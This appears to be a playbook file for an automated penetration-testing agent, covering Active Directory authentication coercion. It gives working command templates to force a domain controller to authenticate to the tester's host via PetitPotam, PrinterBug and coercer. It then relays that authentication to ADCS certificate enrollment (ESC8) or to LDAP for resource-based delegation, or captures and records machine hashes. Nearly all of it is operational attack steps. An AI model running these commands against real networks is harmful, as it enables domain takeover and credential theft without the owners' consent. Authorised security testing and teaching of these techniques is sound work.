---
name: coercion
services: [coercion, petitpotam, printerbug]
summary: Authentication coercion — force a machine (especially a DC) to authenticate to you
---

# Coercion playbook

Coercion forces a target (often a DC) to authenticate to a host you control, so you can relay
that authentication (→ ADCS ESC8, or LDAP for RBCD/Shadow Credentials) or capture and crack the
machine hash. Pair a trigger with a receiver. Use `coercer`/`petitpotam` with `impacket_ntlmrelay`
or `run_daemon`. The commands below are **examples** — compose your own.

## Set up the receiver FIRST
- Example (relay to ADCS ESC8): `impacket_ntlmrelay --target http://<ca>/certsrv/certfnsh.asp --adcs --template DomainController -smb2support`
- Example (relay to LDAP for RBCD): `impacket_ntlmrelay -t ldap://<dc> --delegate-access --escalate-user EVIL$`
- Example (just capture the hash): `run_daemon` responder

## Trigger the coercion
- Example (PetitPotam, MS-EFSR): `petitpotam <your-ip> <dc>`
- Example (PrinterBug, MS-RPRN): `local_exec("printerbug.py <domain>/<user>:<pass>@<dc> <your-ip>")`
- Example (one tool, many methods): `coercer` covers PetitPotam/PrinterBug/DFSCoerce/ShadowCoerce

look for: a coercion method that isn't patched, and a receiver ready **before** you trigger.

## Record
A relayed DC certificate or RBCD edge = critical; `record_credential` any captured machine hashes.
